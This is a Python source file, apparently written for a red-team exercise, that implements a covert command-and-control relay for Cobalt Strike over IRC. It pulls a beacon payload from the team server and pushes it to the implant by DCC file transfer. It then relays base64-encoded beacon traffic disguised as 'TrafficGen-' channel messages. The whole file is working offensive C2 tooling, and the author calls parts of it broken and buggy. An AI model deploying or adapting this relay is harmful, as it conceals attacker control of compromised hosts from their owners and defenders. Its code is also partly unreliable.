"""
    IRCServ.py
    by Lt Daniel Fitzgerald
    Red Flag 19-3 - July 2019

    Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
    
    This was created as a fallback to get basic functionality in a short amount of development time.
    It is not complete and has errors.
    Instead of using cloakify to convert Base64 messages to normal looking strings, it just sends the Base64 
    message over IRC.
        
    Current limitations: Allows for external C2 over IRC but only for small commands (<500 bytes). Large transfer
    is broken due to incorrectly breaking up and parsing Base64 messages.
    
"""
import base64
import ipaddress
import socket
import struct
import sys
import time


class IRCinfo:
    """
    @brief Class to hold info for IRC session
    """
    def __init__(self, src_ip, ip, port, nick, password, user, real_name, channel, client_nick):
        """

        :param ip: IP address of IRC server
        :param port: Port of IRC server
        :param nick: NICK program will connect as
        :param password: PASS program will use
        :param user: USER program will connect as
        :param real_name: REALNAME program will connect as (optional in IRC)
        :param channel: CHANNEL program will auto-join
        :param client_nick: NICK program will send data to (should be NICK C2 client connected as)
        """
        self.src_ip = src_ip
        self.ip = ip
        self.port = port
        self.nick = nick
        self.password = password
        self.user = user
        self.real_name = real_name
        self.channel = channel
        self.client_nick = client_nick
        

class ExternalC2Controller:
    def __init__(self, port):
        self.port = port

    def encode_frame(self, data):
        """
        
        :param data: data to encode in frame
        :return: data packed in a CS external C2 frame
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """
        
        :param data: frame to decode
        :return: length of data and data from frame
        """
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return len, body
    
    def base64(self, msg):
        """

        :param msg: String to encode in Base64
        :return: Base64 encoded string (in bytes)
        """
        b64msg = base64.b64encode(msg)
        return b64msg

    def debase64(self, b64msg):
        """

        :param b64msg: Base64 string to be decoded
        :return: Decoded string
        """
        msg = base64.b64decode(b64msg)
        return msg
    
    def equalcheck(self, b64msg):
        """

        :param b64msg: Base64 string
        :return: Base64 string with == at end of it
        """
        # TODO: Find a better way of checking for end of B64 message
        equalbytes = "=".encode()
        equalequalbytes = "==".encode()
        if b64msg.find(equalequalbytes) != -1:
            return b64msg
        elif b64msg.find(equalbytes) != -1:
            b64msg += equalbytes
            return b64msg
        else:
            b64msg += equalequalbytes
            return b64msg

    def send_to_ts(self, data):
        """
        
        :param data: data to send to team server in the form of a CS External C2 frame
        """
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        """
        
        :return: data received from team server in the form of a CS External C2 frame
        """
        data = bytearray()
        _len = self._socketTS.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketTS.recv(l - len(data))
        return data

    def sendToBeacon(self, ircinfo, data):
        """
        
        :param ircinfo: Class with user IRC info
        :param data: Data to send to beacon
        """
        # TODO: Check this. It is likely broken!!
        if len(data) == 1:
            pingmsg = "PRIVMSG {} :PING\r\n".format(ircinfo.channel)
            self._socketBeacon.sendall(pingmsg.encode())
        else:
            # print("len(data):{}".format(len(data)))
            # print("data:{}".format(data))
            frame = self.encode_frame(data)
            # print("len(frame):{}".format(len(frame)))
            encodedmsg = self.base64(frame)
            # print("len(encodedmsg):{}".format(len(encodedmsg)))
            # print("encodedmsg:{}".format(encodedmsg))
            encodedmsg = self.equalcheck(encodedmsg)
            
            #if len(encodedmsg) > 450:
            offset = 0
            while offset < len(encodedmsg):
                if offset + 425 > len(encodedmsg):
                    ircencodedmsg = "PRIVMSG {} :TrafficGen-{}\r\n".format(ircinfo.channel,
                                                                           encodedmsg[offset:].decode())
                    self._socketBeacon.sendall(ircencodedmsg.encode())
                    break
                else:
                    ircencodedmsg = "PRIVMSG {} :TrafficGen-{}\r\n".format(ircinfo.channel, 
                                                                           encodedmsg[offset:offset+425].decode())
                    offset += 425
                    self._socketBeacon.sendall(ircencodedmsg.encode())
                
            # print("Sending encoded msg:{}".format(encodedmsg.decode()))
            #ircencodedmsg = "PRIVMSG {} :TrafficGen-{}\r\n".format(ircinfo.channel, encodedmsg.decode())
            #self._socketBeacon.sendall(ircencodedmsg.encode())

    def recvFromBeacon(self):
        """
        
        :return: data received from beacon
        """
        # TODO: Check this! It is likely broken.
        data = ""
        message = ""
        while True:
            data = self._socketBeacon.recv(1024).decode()
            if len(data) != 0:
                print("From IRC Server: {}".format(data))
            self.ping_check(data)
            
            if data.find("PRIVMSG ") != -1:
                traffic = "PRIVMSG {} :TrafficGen-".format(ircinfo.channel)
                if data.find(traffic) != -1:
                    offset = data.find(traffic)
                    if offset != -1:
                        # iterate to beginning of message
                        offset += len(traffic)
                        # -2 to strip \r\n
                        b64msg = data[offset:-2]
                        message += b64msg
                        if data.find("==") != -1:
                            print("Base64 msg:{}".format(message))
                            message = self.debase64(message)
                            break

                quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
                quitmsg = "QUIT :\r\n"
                chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
                if data.find(chanexit) != -1:
                    self._socketBeacon.sendall(quitting.encode())
                    self._socketBeacon.sendall(quitmsg.encode())
                    
            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link") != -1:
                    print("Error was to close link!")
                    return None
        return message[4:]

    def ping_check(self, data):
        """

        :param data: String received from IRC Server
        """
        if data.find("PING :") != -1:
            pingsvr = data[5:]
            pong = "PONG {}".format(pingsvr)
            self._socketBeacon.sendall(pong.encode())

    def connect_to_irc(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        time.sleep(1)
        password = "PASS {}\r\n".format(ircinfo.password)
        self._socketBeacon.sendall(password.encode())
        nick = "NICK {}\r\n".format(ircinfo.nick)
        self._socketBeacon.sendall(nick.encode())
        user = "USER {} {} {} :{}\r\n".format(ircinfo.user, "0", "*", ircinfo.real_name)
        self._socketBeacon.sendall(user.encode())
        while True:
            data = self._socketBeacon.recv(1024).decode()
            print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("MODE ") != -1:
                print("Connection done?")
                break

        userhost = "USERHOST {}\r\n".format(ircinfo.user)
        self._socketBeacon.sendall(userhost.encode())
        data = self._socketBeacon.recv(1024).decode()
        print("From IRC Server: {}".format(data))

    def dcc_listen(self, ircinfo, port):
        """
        
        :param ircinfo: Class with user IRC info
        :param port: Port to listen on
        :return: True if successful, False if not
        """
        self._socketDCC = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketDCC.bind((ircinfo.src_ip, port))
        self._socketDCC.settimeout(60.0)
        try:
            self._socketDCC.listen(1)
        except socket.timeout:
            print("Didn't receive connection from client in time! (60 sec)")
            self._socketDCC.close()
            return False

        self._socketDCCConn = self._socketDCC.accept()[0]
        print("Received DCC connection")
        return True

    def dcc_send(self, filename, filesize, port, ircinfo):
        """
        
        :param filename: Name of file to send (not used by client) 
        :param filesize: Size of file to send
        :param port: Port to listen on
        :param ircinfo: Class with user IRC info
        :return: True if successful, False if not
        """
        dcc_notice = "NOTICE {} :DCC Send {} ({})\r\n".format(ircinfo.client_nick, filename, ircinfo.src_ip)
        dcc_send = "PRIVMSG {} :\01DCC SEND {} {} {} {}\01\r\n" \
            .format(ircinfo.client_nick, filename, int(ipaddress.IPv4Address(ircinfo.src_ip)), port, filesize)
        self._socketBeacon.sendall(dcc_notice.encode())
        self._socketBeacon.sendall(dcc_send.encode())
        return self.dcc_listen(ircinfo, port)

    def join_channel(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        join = "JOIN {}\r\n".format(ircinfo.channel)
        self._socketBeacon.sendall(join.encode())
        
    def become_oper(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        oper = "OPER {} {}\r\n".format(ircinfo.client_nick, ircinfo.password)
        self._socketBeacon.sendall(oper.encode())

    def wait_for_client(self, ircinfo):
        """

        :return: True if cloak message is seen, False if Closing Link message is seen
        """
        while True:
            data = self._socketBeacon.recv(1024).decode()
            if len(data) != 0:
                print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("PRIVMSG ") != -1:
                cloak = "PRIVMSG {} :cloak".format(ircinfo.channel)
                if data.find(cloak) != -1:
                    return True

                quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
                quitmsg = "QUIT :\r\n"
                chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
                if data.find(chanexit) != -1:
                    self._socketBeacon.sendall(quitting.encode())
                    self._socketBeacon.sendall(quitmsg.encode())
                    return False            

            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link") != -1:
                    print("Error was to close link!")
                    return False

    def run(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        :return: 1 on error
        """
        # First thing, wait for a connection from our custom beacon
        self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._socketBeacon.connect((ircinfo.ip, ircinfo.port))

        self.connect_to_irc(ircinfo)
        self.join_channel(ircinfo)
        self.become_oper(ircinfo)

        if self.wait_for_client(ircinfo):
            print("Received C2 connection")
        else:
            print("Link Closed.")
            return False

        # Now we have a beacon connection, we kick off comms with CS External C2
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketTS.connect(("127.0.0.1", self.port))

        # Send out config options
        self.send_to_ts("arch=x86".encode())
        self.send_to_ts("pipename=mIRC".encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our custom beacon
        data = self.recv_from_ts()

        # Client is connected to IRC, now transfer beacon via DCC
        # TODO: make this into a function
        # TODO: make file name and port configurable (1024 is mIRC default)
        if self.dcc_send("filetransfer.txt", len(data), 1024, ircinfo):
            self._socketDCCConn.sendall(self.encode_frame(data))
            self._socketDCCConn.close()
            self._socketDCC.close()
        else:
            return False

        while True:
            data = self.recvFromBeacon()
            print("Received %d bytes from beacon" % len(data))

            print("Sending %d bytes to TS" % len(data))
            self.send_to_ts(data)

            data = self.recv_from_ts()
            print("Received %d bytes from TS" % len(data))
            # If bigger than 2048 then send over DCC file transfer
            if len(data) > 2048:
                # Client is connected to IRC, now transfer beacon via DCC
                # TODO: make file name and port configurable (1024 is mIRC default)
                if self.dcc_send("filetransferexample.txt", len(data), 1024, ircinfo):
                    self._socketDCCConn.sendall(self.encode_frame(data))
                    self._socketDCCConn.close()
                    self._socketDCC.close()
                else:
                    return False
            else:
                print("Sending %d bytes to beacon" % len(data))
                self.sendToBeacon(ircinfo, data)


if len(sys.argv) != 10:
    print("Number of args passed: {}".format(len(sys.argv)))
    print("Args: {}".format(str(sys.argv)))
    print("Incorrect number of args: \"[SRC_IP]\" \"[IP]\" \"[PORT]\" \"[NICK]\" \"[PASS]\" \"[USER]\" \"[REAL_NAME]\""
          " \"[CHANNEL]\" \"[CLIENT_NICK]\"")
else:
    controller = ExternalC2Controller(2222)
    # ircinfo = IRCinfo("192.168.136.130", "192.168.136.128", 6667, "servbot", "bot", "covertserv", "covertIRCserv",
    #                   "#bot", "bot")
    ircinfo = IRCinfo(sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7], 
                      sys.argv[8], sys.argv[9])
    controller.run(ircinfo)
